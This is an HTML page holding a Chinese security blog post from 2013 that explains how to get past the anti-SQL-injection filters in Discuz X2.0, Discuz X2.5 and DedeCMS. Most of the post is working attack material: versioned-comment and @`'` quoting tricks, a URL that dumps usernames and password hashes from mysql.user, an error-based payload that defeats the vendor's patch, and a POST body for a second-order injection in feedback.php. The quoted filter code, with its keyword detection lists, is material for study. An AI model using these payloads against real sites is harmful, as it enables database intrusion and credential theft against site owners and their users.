@@ -1,0 +1,1154 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>几种通用防注入程序绕过方法 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="genxor" /><meta name="description" content="几种通用防注入程序绕过方法。目前主流的CMS系统当中都会内置一些防注入的程序，例如Discuz、dedeCMS等，本篇主要介绍绕过方法。防注入原理。这里以Discuz最近爆出的一个插件的注入漏洞为例，来详细说明绕过方法。漏洞本身很简单，存在于/source/plugin/v63shop/config.inc.php中的第29行getGoods函数中，代码如下所示。触发漏洞的入口点在/source/plugin/v63shop/goods.inc.php中的第6行和第8行，如图所示：下面可以构造如下请求触发漏洞了，如图所示：不过程序内置了一个_do_query_safe函数用来防注入，如图所示" />
+<meta name="keywords" content="几种通用防注入程序绕过方法" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3780/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="几种通用防注入程序绕过方法" />
+<meta property="og:description" content="几种通用防注入程序绕过方法。目前主流的CMS系统当中都会内置一些防注入的程序，例如Discuz、dedeCMS等，本篇主要介绍绕过方法。防注入原理。这里以Discuz最近爆出的一个插件的注入漏洞为例，来详细说明绕过方法。漏洞本身很简单，存在于/source/plugin/v63shop/config.inc.php中的第29行getGoods函数中，代码如下所示。触发漏洞的入口点在/source/plugin/v63shop/goods.inc.php中的第6行和第8行，如图所示：下面可以构造如下请求触发漏洞了，如图所示：不过程序内置了一个_do_query_safe函数用来防注入，如图所示" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3780/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2013-07-31T09:30:28&#43;08:00" />
+<meta property="article:modified_time" content="2013-07-31T10:11:59&#43;08:00" />
+
+<meta itemprop="name" content="几种通用防注入程序绕过方法">
+<meta itemprop="description" content="几种通用防注入程序绕过方法。目前主流的CMS系统当中都会内置一些防注入的程序，例如Discuz、dedeCMS等，本篇主要介绍绕过方法。防注入原理。这里以Discuz最近爆出的一个插件的注入漏洞为例，来详细说明绕过方法。漏洞本身很简单，存在于/source/plugin/v63shop/config.inc.php中的第29行getGoods函数中，代码如下所示。触发漏洞的入口点在/source/plugin/v63shop/goods.inc.php中的第6行和第8行，如图所示：下面可以构造如下请求触发漏洞了，如图所示：不过程序内置了一个_do_query_safe函数用来防注入，如图所示"><meta itemprop="datePublished" content="2013-07-31T09:30:28&#43;08:00" />
+<meta itemprop="dateModified" content="2013-07-31T10:11:59&#43;08:00" />
+<meta itemprop="wordCount" content="3896">
+<meta itemprop="keywords" content="程序,绕过,注入,CMS,dedecms,Discuz,HTTP,IDS,IP,Mysql,PHP,POS,SQL,URL,查询,代码,分析,函数,黑客,检测,漏洞,数据,数据库,系统," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="几种通用防注入程序绕过方法"/>
+<meta name="twitter:description" content="几种通用防注入程序绕过方法。目前主流的CMS系统当中都会内置一些防注入的程序，例如Discuz、dedeCMS等，本篇主要介绍绕过方法。防注入原理。这里以Discuz最近爆出的一个插件的注入漏洞为例，来详细说明绕过方法。漏洞本身很简单，存在于/source/plugin/v63shop/config.inc.php中的第29行getGoods函数中，代码如下所示。触发漏洞的入口点在/source/plugin/v63shop/goods.inc.php中的第6行和第8行，如图所示：下面可以构造如下请求触发漏洞了，如图所示：不过程序内置了一个_do_query_safe函数用来防注入，如图所示"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">几种通用防注入程序绕过方法</h1>
+      
+      <div class="post-meta">
+        <time datetime="2013-07-31" class="post-time">
+          2013-07-31
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E7%A8%8B%E5%BA%8F/"> 程序 </a>
+            <a href="https://lcx.cc/categories/%E7%BB%95%E8%BF%87/"> 绕过 </a>
+            <a href="https://lcx.cc/categories/%E6%B3%A8%E5%85%A5/"> 注入 </a>
+            
+          </div>
+        <span class="more-meta"> 约 3896 字 </span>
+          <span class="more-meta"> 预计阅读 8 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	<strong>0x00 前言</strong> 
+</p>
+<p style="text-indent:2em;">
+	目前主流的CMS系统当中都会内置一些防注入的程序，例如Discuz、dedeCMS等，本篇主要介绍绕过方法。
+</p>
+<p style="text-indent:2em;">
+	<strong>0x01 Discuz x2.0防注入</strong> 
+</p>
+<p style="text-indent:2em;">
+	<strong>防注入原理</strong> 
+</p>
+<p style="text-indent:2em;">
+	这里以Discuz最近爆出的一个插件的注入漏洞为例，来详细说明绕过方法。
+</p>
+<p style="text-indent:2em;">
+	漏洞本身很简单，存在于<strong>/source/plugin/v63shop/config.inc.php</strong>中的第29行getGoods函数中，代码如下所示
+</p>
+<pre class="prettyprint">function getGoods($id){
+      $query = DB::query('select * from '.DB::table('v63_goods').' where `id` ='.$id);
+        $goods = DB::fetch($query);
+        $goods['endtime2'] = date('Y-m-d',$goods['endtime']);
+        $goods['price2'] = $goods['price'];
+        if($goods['sort'] ==2){
+            $goods['endtime2']= date('Y-m-d H:i:s',$goods['endtime']);
+            $query = DB::query("select * from ".DB::table('v63_pm')." where gid='$goods[id]' order by id desc ");
+            $last = DB::fetch($query);
+            if(is_array($last)){
+                $goods['price'] = $last['chujia'];
+                $goods['uid']  = $last['uid'];
+                $goods['username']  = $last['username'];
+                $goods['pm'] = $last;
+                if(time()+600&gt; $goods['endtime']){
+                    $goods['endtime'] = $last[time]+600;
+                    $goods['endtime2']= date('Y-m-d H:i:s',$last[time]+600);
+                }
+            }
+        }
+        return $goods;
+}</pre>
+<p style="text-indent:2em;">
+	触发漏洞的入口点在<strong>/source/plugin/v63shop/goods.inc.php</strong>中的第6行和第8行，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="触发漏洞的入口点" alt="触发漏洞的入口点" src="/file/old/2821_p1.png" width="478" height="150" /> 
+</p>
+<p style="text-indent:2em;">
+	下面可以构造如下请求触发漏洞了，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="构造如下请求触发漏洞" alt="构造如下请求触发漏洞" src="/file/old/2822_p2.png" width="647" height="431" /> 
+</p>
+<p style="text-indent:2em;">
+	不过程序内置了一个_do_query_safe函数用来防注入，如图所示
+</p>
+<p style="text-indent:2em;">
+	<img title="_do_query_safe" alt="_do_query_safe" src="/file/old/2823_p3.png" width="713" height="411" /> 
+</p>
+<p style="text-indent:2em;">
+	这里跟踪一下_do_query_safe()函数的执行，它会对以下关键字做过滤，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="_do_query_safe()函数" alt="_do_query_safe()函数" src="/file/old/2824_p4.png" width="620" height="320" /> 
+</p>
+<p style="text-indent:2em;">
+	因为我们的url中出现了union select，所以会被过滤掉。
+</p>
+<p style="text-indent:2em;">
+	<strong>绕过方法</strong> 
+</p>
+<p style="text-indent:2em;">
+	这里利用Mysql的一个特性绕过_do_query_safe函数过滤，提交如下url：
+</p>
+<pre class="prettyprint"> http://localhost/discuzx2/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=1 and 1=2 union /*!50000select*/ 1,2,3,4,5,6,concat(user,0x23,password),8,9,10,11,12,13 from mysql.user</pre>
+<p style="text-indent:2em;">
+	这里我们跟踪一下，绕过的具体过程。它会将/**/中间的内容去掉，然后保存在$clean变量中，其值为
+</p>
+<pre class="prettyprint"> select * from pre_v63_goods where `id` =1 and 1=2 union /**/ 1,2,3,4,5,6,concat(user,0x23,password),8,9,10,11,12,13 from mysql.user</pre>
+<p style="text-indent:2em;">
+	再进一步跟踪，它会将 /**/ 也去掉，然对$clean变量做过滤，如图所示
+</p>
+<p style="text-indent:2em;">
+	<img title="然对$clean变量做过滤" alt="然对$clean变量做过滤" src="/file/old/2825_p5.png" width="668" height="107" /> 
+</p>
+<p style="text-indent:2em;">
+	此时$clean值，如图所示
+</p>
+<p style="text-indent:2em;">
+	<img title="$clean值" alt="$clean值" src="/file/old/2826_p6.png" width="557" height="337" /> 
+</p>
+<p style="text-indent:2em;">
+	此时$clean变量中不在含有危险字符串，绕过_do_query_safe函数过滤，成功注入，截图如下：
+</p>
+<p style="text-indent:2em;">
+	<img title="绕过_do_query_safe函数过滤" alt="绕过_do_query_safe函数过滤" src="/file/old/2827_p7.png" width="704" height="416" /> 
+</p>
+<p style="text-indent:2em;">
+	<strong>0x02 Discuz X2.5防注入</strong> 
+</p>
+<p style="text-indent:2em;">
+	<strong>防注入原理</strong> 
+</p>
+<p style="text-indent:2em;">
+	Discuz X2.5版修改了防注入函数的代码，在<strong>/config/config_global.php</strong>中有如下代码，如图所示
+</p>
+<p style="text-indent:2em;">
+	<img title="防注入函数的代码" alt="防注入函数的代码" src="/file/old/2828_p8.png" width="600" height="165" /> 
+</p>
+<p style="text-indent:2em;">
+	这里 $_config['security']['querysafe']['afullnote']  默认被设置为0，重点关注这一点。
+</p>
+<p style="text-indent:2em;">
+	这里跟踪一下失败的原因，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="失败的原因" alt="失败的原因" src="/file/old/2829_p9.png" width="710" height="375" /> 
+</p>
+<p style="text-indent:2em;">
+	此时观察一下变量，_do_query_safe($sql)函数会将 /**/ 中的内容去掉，然后存到$clean中，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="，_do_query_safe($sql)函数会将 /**/ 中的内容去掉，然后存到$clean中" alt="，_do_query_safe($sql)函数会将 /**/ 中的内容去掉，然后存到$clean中" src="/file/old/2830_p10.png" width="586" height="242" /> 
+</p>
+<p style="text-indent:2em;">
+	其实，程序执行到这里跟Discuz X2.0没有区别，$clean的值都一样。但是关键在下面，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img alt="" src="/file/old/2842_p11.png" width="470" height="85" /> 
+</p>
+<p style="text-indent:2em;">
+	因为前面提到$_config['security']['querysafe']['afullnote']=’0’，所以这里不会替换 /**/ 为空，并且它在后面会判断$clean中是否会出现“/*”，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="注入失败" alt="注入失败" src="/file/old/2831_p12.png" width="550" height="181" /> 
+</p>
+<p style="text-indent:2em;">
+	所以注入失败。
+</p>
+<p style="text-indent:2em;">
+	<strong>绕过方法</strong> 
+</p>
+<p style="text-indent:2em;">
+	在Mysql当中，定义变量用@字符，可以用set @a=’abc’，来为变量赋值。这里为了合法的构造出一个单引号，目的是为了让sql正确，我们可以用@ ' 放入sql语句当中，帮助我们绕过防注入程序检查。
+</p>
+<p style="text-indent:2em;">
+	这里利用如下方式绕过_do_query_safe函数过滤，如下所示：
+</p>
+<pre class="prettyprint"> http://localhost/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=@`'` union select @`'`,2,3,4,5,6,7,concat(user,0x3a,password),9,10,11,12,13,14 from mysql.user</pre>
+<p style="text-indent:2em;">
+	这里跟踪一下执行的过程，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2832_p14.png" target="_blank"><img title="执行的过程" alt="执行的过程" src="/file/old/2832_p14.png" width="780" height="132" /></a> 
+</p>
+<p style="text-indent:2em;">
+	这里有一个if判断，重点看这句
+</p>
+<pre class="prettyprint">$clean = preg_replace("/'(.+?)'/s", '', $sql);</pre>
+<p style="text-indent:2em;">
+	它会将$sql中单引号引起来的字符串省略掉，所以我们可以用绕过dede防住ids的思路，利用
+</p>
+<pre class="prettyprint"> @`'` union select @`'`</pre>
+<p style="text-indent:2em;">
+	这样的方法，在下面的过滤中省掉union select，这里跟踪一下，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img alt="" src="/file/old/2833_p15.png" width="624" height="233" /> 
+</p>
+<p style="text-indent:2em;">
+	这样便绕过了_do_query_safe函数检测，成功绕过防注入，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="成功绕过防注入" alt="成功绕过防注入" src="/file/old/2834_p16.png" width="718" height="463" /> 
+</p>
+<p style="text-indent:2em;">
+	不过后来Discuz官方发布了一个修复补丁，但并没用从根本上解决问题。官方的修复代码如下：
+</p>
+<p style="text-indent:2em;">
+	<img title="官方的修复代码" alt="官方的修复代码" src="/file/old/2841_p171.png" width="504" height="87" /> 
+</p>
+<p style="text-indent:2em;">
+	加了一个判断，过滤字符串中的@，但是始终没有修复根本问题，关键是上边的那个if判断会将单引号之间的内容（包括单引号）替换为空，代码如下：
+</p>
+<pre class="prettyprint">if (strpos($sql, '/') === false &amp;&amp; strpos($sql, '#') === false &amp;&amp; strpos($sql, '-- ') === false) {
+    $clean = preg_replace("/'(.+?)'/s", '', $sql);
+}</pre>
+<p style="text-indent:2em;">
+	这里我只要稍做一下变换就可以让@字符消失，从而绕过它的过滤，利用如下所示：
+</p>
+<pre class="prettyprint"> http://localhost/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=`'` or @`''` union select 1 from (select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)b where @`'`</pre>
+<p style="text-indent:2em;">
+	这里我引入了`'`用来隐藏第一个@字符，并将第一个@`'`替换为@`''`，这样便可以替换掉第二个@，这里我们跟踪一下代码，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="跟踪一下代码" alt="跟踪一下代码" src="/file/old/2835_p18.png" width="664" height="176" /> 
+</p>
+<p style="text-indent:2em;">
+	可以看到$clean变为
+</p>
+<pre class="prettyprint"> select * from pre_v63_goods where `id` =``</pre>
+<p style="text-indent:2em;">
+	成功绕过补丁，如图所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="成功绕过补丁" alt="成功绕过补丁" src="/file/old/2836_p19.png" width="764" height="393" /> 
+</p>
+<p style="text-indent:2em;">
+	不过这样做的代价是不能再使用union select了，只能通过报错获取数据。
+</p>
+<p style="text-indent:2em;">
+	<strong>0x03 DedeCMS防注入</strong> 
+</p>
+<p style="text-indent:2em;">
+	<strong>防注入原理</strong> 
+</p>
+<p style="text-indent:2em;">
+	这里我也以最近热点分析的dedeCMS feedback.php注入漏洞为例，分析如何绕过其防注入系统。不过在这之前，还得先提一下这个漏洞。
+</p>
+<p style="text-indent:2em;">
+	漏洞存在于/plus/feedback.php中的第244行，代码如下所示
+</p>
+<pre class="prettyprint"> if($comtype == 'comments')
+    {
+        $arctitle = addslashes($title);
+        $typeid = intval($typeid);
+        $ischeck = intval($ischeck);
+        $feedbacktype = preg_replace("#[^0-9a-z]#i", "", $feedbacktype);
+        if($msg!='')
+        {
+            $inquery = "INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`)
+                   VALUES ('$aid','$typeid','$username','$arctitle','$ip','$ischeck','$dtime', '{$cfg_ml-&gt;M_ID}','0','0','$feedbacktype','$face','$msg'); ";
+            $rs = $dsql-&gt;ExecuteNoneQuery($inquery);
+            if(!$rs)
+            {
+                ShowMsg(' 发表评论错误! ', '-1');
+                //echo $dsql-&gt;GetError();
+                exit();
+            }
+        }
+    }
+    //引用回复
+    elseif ($comtype == 'reply')
+    {
+        $row = $dsql-&gt;GetOne("SELECT * FROM `#@__feedback` WHERE id ='$fid'");
+        $arctitle = $row['arctitle'];
+        $aid =$row['aid'];
+        $msg = $quotemsg.$msg;
+        $msg = HtmlReplace($msg, 2);
+        $inquery = "INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`,`mid`,`bad`,`good`,`ftype`,`face`,`msg`)
+                VALUES ('$aid','$typeid','$username','$arctitle','$ip','$ischeck','$dtime','{$cfg_ml-&gt;M_ID}','0','0','$feedbacktype','$face','$msg')";
+        $dsql-&gt;ExecuteNoneQuery($inquery);
+    }</pre>
+<p style="text-indent:2em;">
+	这里$title变量未初始化，所以$title可以作为可控变量，所以我们可以进一步控制$arctitle。跟踪发现$arctitle被直接带入SQL语句当中，但是这里执行的INSERT语句入库之后会将前面addslashes转义的单引号在会员还原回去。进一步跟踪下面的代码，在第268行，如下所示
+</p>
+<pre class="prettyprint"> $row = $dsql-&gt;GetOne("SELECT * FROM `#@__feedback` WHERE id ='$fid'");
+$arctitle = $row['arctitle'];</pre>
+<p style="text-indent:2em;">
+	这里的查询#@__feedback表正式上面INSERT的那个表，arctitle字段取出来放到$arctitle变量当中，继续跟踪到第273行，这下豁然开朗了，
+</p>
+<pre class="prettyprint"> $inquery = "INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`,`mid`,`bad`,`good`,`ftype`,`face`,`msg`)
+                VALUES ('$aid','$typeid','$username','$arctitle','$ip','$ischeck','$dtime','{$cfg_ml-&gt;M_ID}','0','0','$feedbacktype','$face','$msg')";</pre>
+<p style="text-indent:2em;">
+	这里$arctitle变量未作任何处理，就丢进了SQL语句当中，由于我们可以控制$title，虽然$arctitle是被addslashes函数处理过的数据，但是被INSERT到数据库中又被还原了，所以综合起来这就造成了二次注入漏洞。
+</p>
+<p style="text-indent:2em;">
+	但是这里如何利用呢，通过跟踪代码发现，整个dede在整个过程中始终没有输出信息，所以我们无法通过构造公式报错来获取数据，但是进一步分析代码发现#@__feedback表当中的msg字段会被输出。由于$arctitle变量是可控的，所以我们可以通过构造SQL语句，将我们要执行的代码插入到msg字段当中，这样便可以输出执行的内容了。
+</p>
+<p style="text-indent:2em;">
+	<strong>绕过方法</strong> 
+</p>
+<p style="text-indent:2em;">
+	众所周知，dedeCMS内置了一个CheckSql()函数用来防注入，它是80sec开发的通用防注入ids程序，每当执行sql之前都要用它来检查一遍。其代码如下所示：
+</p>
+<pre class="prettyprint">function CheckSql($db_string,$querytype='select')
+    {
+        global $cfg_cookie_encode;
+        $clean = '';
+        $error='';
+        $old_pos = 0;
+        $pos = -1;
+        $log_file = DEDEINC.'/../data/'.md5($cfg_cookie_encode).'_safe.txt';
+        $userIP = GetIP();
+        $getUrl = GetCurUrl();
+
+        //如果是普通查询语句，直接过滤一些特殊语法
+        if($querytype=='select')
+        {
+            $notallow1 = "[^0-9a-z@\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\.-]{1,}";
+
+            //$notallow2 = "--|/\*";
+            if(preg_match("/".$notallow1."/i", $db_string))
+            {
+                fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||SelectBreak\r\n");
+                exit("&lt;font size='5' color='red'&gt;Safe Alert: Request Error step 1 !&lt;/font&gt;");
+            }
+        }
+
+        //完整的SQL检查
+        while (TRUE)
+        {
+            $pos = strpos($db_string, '\'', $pos + 1);
+            if ($pos === FALSE)
+            {
+                break;
+            }
+            $clean .= substr($db_string, $old_pos, $pos - $old_pos);
+            while (TRUE)
+            {
+                $pos1 = strpos($db_string, '\'', $pos + 1);
+                $pos2 = strpos($db_string, '\\', $pos + 1);
+                if ($pos1 === FALSE)
+                {
+                    break;
+                }
+                elseif ($pos2 == FALSE || $pos2 &gt; $pos1)
+                {
+                    $pos = $pos1;
+                    break;
+                }
+                $pos = $pos2 + 1;
+            }
+            $clean .= '$s$';
+            $old_pos = $pos + 1;
+        }
+        $clean .= substr($db_string, $old_pos);
+        $clean = trim(strtolower(preg_replace(array('~\s+~s' ), array(' '), $clean)));
+
+        //老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它
+        if (strpos($clean, 'union') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="union detect";
+        }
+
+        //发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们
+        elseif (strpos($clean, '/*') &gt; 2 || strpos($clean, '--') !== FALSE || strpos($clean, '#') !== FALSE)
+        {
+            $fail = TRUE;
+            $error="comment detect";
+        }
+
+        //这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库
+        elseif (strpos($clean, 'sleep') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="slown down detect";
+        }
+        elseif (strpos($clean, 'benchmark') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="slown down detect";
+        }
+        elseif (strpos($clean, 'load_file') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="file fun detect";
+        }
+        elseif (strpos($clean, 'into outfile') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])into\s+outfile($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="file fun detect";
+        }
+
+        //老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息
+        elseif (preg_match('~\([^)]*?select~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="sub select detect";
+        }
+        if (!empty($fail))
+        {
+            fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||$error\r\n");
+            exit("&lt;font size='5' color='red'&gt;Safe Alert: Request Error step 2!&lt;/font&gt;");
+        }
+        else
+        {
+            return $db_string;
+        }
+    }</pre>
+<p style="text-indent:2em;">
+	但通过跟踪这段代码发现，它有个特征就是会将两个单引号之间的内容用$s$替换，例如’select’会被替换为$s$，这里用两个@`'`包含敏感字，这样$clean变量中就不会出现敏感字，从而绕过CheckSql()函数检测。
+</p>
+<p style="text-indent:2em;">
+	这里可以设置title为如下代码，一方面绕过ids防注入代码检测，另一方面加一个#注释掉后面的代码，但是还要做一下变形，就是这个char(@`'`)了。因为#@__feedback的所有字段都被设置为NOT NULL，而@`'`是一个变量，默认为NULL，直接插入@`'`的话会报错，所以需要以char(@`'`)的方法转换一下。
+</p>
+<pre class="prettyprint"> ',char(@`'`),1,1,1,1,1,1,1,(SELECT user()))#,(1,</pre>
+<p style="text-indent:2em;">
+	跟踪代码，如图所示
+</p>
+<p style="text-indent:2em;">
+	<img title="跟踪代码" alt="跟踪代码" src="/file/old/2837_p20.png" width="778" height="363" /> 
+</p>
+<p style="text-indent:2em;">
+	如下SQL语句
+</p>
+<pre class="prettyprint"> INSERT INTO `dede_feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`) VALUES ('1','1','游客','\',char(@`\'`),1,1,1,1,1,1,1,(SELECT user()))#,(1,','127.0.0.1','1','1364401789', '0','0','0','feedback','1','genxor');</pre>
+<p style="text-indent:2em;">
+	被替换为了
+</p>
+<pre class="prettyprint"> insert into `dede_feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`) values ($s$,$s$,$s$,$s$,$s$,$s$,$s$, $s$,$s$,$s$,$s$,$s$,$s$);</pre>
+<p style="text-indent:2em;">
+	字符串中没有任何敏感字，成功绕过CheckSql()函数检测。
+</p>
+<p style="text-indent:2em;">
+	POST如下请求给feedback.php，如下所示：
+</p>
+<pre class="prettyprint">    action=send&amp;comtype=comments&amp;aid=1&amp;isconfirm=yes&amp;feedbacktype=feedback&amp;face=1&amp;msg=genxor&amp;notuser=1&amp;typeid=1&amp;title=',char(@`'`),1,1,1,1,1,1,1,(SELECT user()))#,(1,</pre>
+<p style="text-indent:2em;">
+	跟踪代码，实际执行的SQL语句跟踪变量如下所示：
+</p>
+<p style="text-indent:2em;">
+	<img title="实际执行的SQL语句跟踪变量" alt="实际执行的SQL语句跟踪变量" src="/file/old/2838_p21.png" width="642" height="256" /> 
+</p>
